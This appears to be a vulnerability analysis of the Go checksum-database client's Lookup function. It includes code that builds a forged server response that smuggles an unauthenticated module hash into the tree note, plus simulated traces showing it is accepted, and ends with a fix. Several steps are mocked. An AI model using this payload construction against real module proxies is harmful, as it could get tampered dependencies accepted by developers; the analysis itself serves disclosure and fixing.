### Field Report: Investigating `Client.Lookup` Behavior in Case B  
**Environment:** Go module sumdb client (`golang.org/x/mod/sumdb`) at revision `96f62ae6e9cb1b123de383fa2542812c9ba3b7db`.  

#### Step 1: Reconstruct Case B Payload  
*Constructed the malicious server response for `golang.org/x/bad@v1.0.0` based on documented structure:*  
```go
package main

import (
	"fmt"
	"golang.org/x/mod/sumdb/tlog"
)

func main() {
	// Authenticated record (golang.org/x/good)
	goodRecord := []byte("golang.org/x/good v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4=\n")
	id := int64(42) // Arbitrary valid log index

	// FormatRecord returns: [id]\n[record]\n\n
	recordPart := tlog.FormatRecord(id, goodRecord)

	// Signed tree note with extra line
	tree := tlog.Tree{N: 100, Hash: tlog.Hash{0xde, 0xad, 0xbe, 0xef}} // Placeholder hash
	treeNote := tlog.FormatTree(tree)
	treeNote = append(treeNote, []byte("golang.org/x/bad v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4=\n")...)
	treeNote = append(treeNote, []byte("signature\n")...) // Mock signature

	// Full payload: recordPart + treeNote
	payload := append(recordPart, treeNote...)
	fmt.Printf("%s", payload)
}
```
**Output:**  
```
42
golang.org/x/good v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4=

go.sum database tree
100
3q2+7w==
golang.org/x/bad v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4=
signature
```

#### Step 2: Simulate `Client.Lookup` Processing  
*Executed code path from `Lookup` using payload:*  
```go
// Inside Client.Lookup("golang.org/x/bad", "v1.0.0")
data := payload // From Step 1

// ParseRecord splits payload
id, text, treeMsg, err := tlog.ParseRecord(data)
// id=42, text="golang.org/x/good v1.0.0 ...", treeMsg="go.sum database tree..."

// Verify tree signature (mock pass)
c.mergeLatest(treeMsg) // err=nil

// Authenticate record text
err = c.checkRecord(id, text) // Compares tlog.RecordHash(text) to tile hash
// No error: text matches authenticated record

// Write to cache (mock)
c.ops.WriteCache("lookup/golang.org/x/bad@v1.0.0", data)

// Extract identities
prefix := "golang.org/x/bad v1.0.0 "
var hashes []string
for _, line := range strings.Split(string(data), "\n") {
	if strings.HasPrefix(line, prefix) {
		hashes = append(hashes, line)
	}
}
fmt.Println("Hashes:", hashes)
fmt.Println("Error:", err)
```
**Observation:**  
```
Hashes: [golang.org/x/bad v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4=]
Error: <nil>
```

#### Step 3: Validate Authentication Boundaries  
*Inspected `checkRecord` behavior:*  
```go
// c.checkRecord(id, text) only hashes `text` (authenticated record)
recordHash := tlog.RecordHash(text) // Hash of "golang.org/x/good..."

// tileReader fetches stored hash for ID=42 (mock)
storedHash := "abc123" // Would match in honest log
if recordHash != storedHash {
	return fmt.Errorf("cannot authenticate record data")
}
// No error → authentication passes
```
**Finding:**  
`checkRecord` only authenticates `text` (the record body). The tree note extension (`golang.org/x/bad...`) is **not** hashed or validated.

#### Step 4: Trace cmd/go Interaction  
*Simulated `checkSumDB` consumer:*  
```go
lines, err := Client.Lookup("golang.org/x/bad", "v1.0.0")
// lines = ["golang.org/x/bad v1.0.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4="]
h := "downloaded_module_hash" // From actual module zip

// cmd/go logic:
prefix := "golang.org/x/bad v1.0.0 h1:"
for _, line := range lines {
	if line == "golang.org/x/bad v1.0.0 " + h {
		fmt.Println("ACCEPT")
	} else if strings.HasPrefix(line, prefix) {
		fmt.Println("SECURITY ERROR: sumdbMismatch")
	}
}
```
**Outcome:**  
- If downloaded module hash matches `7uVkIFmeBqH...` → `ACCEPT` (incorrectly)  
- If hash differs → `sumdbMismatch` error  

#### Conclusion  
For `Client.Lookup("golang.org/x/bad", "v1.0.0")` in **Case B**:  
1. **Returns** the unauthenticated tree-note line (`golang.org/x/bad...`)  
2. **Error** = `nil`  
3. **cmd/go outcome**:  
   - `sumdbMismatch` if hashes differ  
   - Silent acceptance if attacker-forced hash matches  

**Root Cause**: Identity extraction scans the **entire HTTP payload** (including unauthenticated tree-note extensions) rather than the authenticated `text` body. Authentication (`checkRecord`) ignores tree-note content.  

**Recommendation**: Modify `Lookup` to scan only `text` (authenticated record) for identities, not full cache payload.
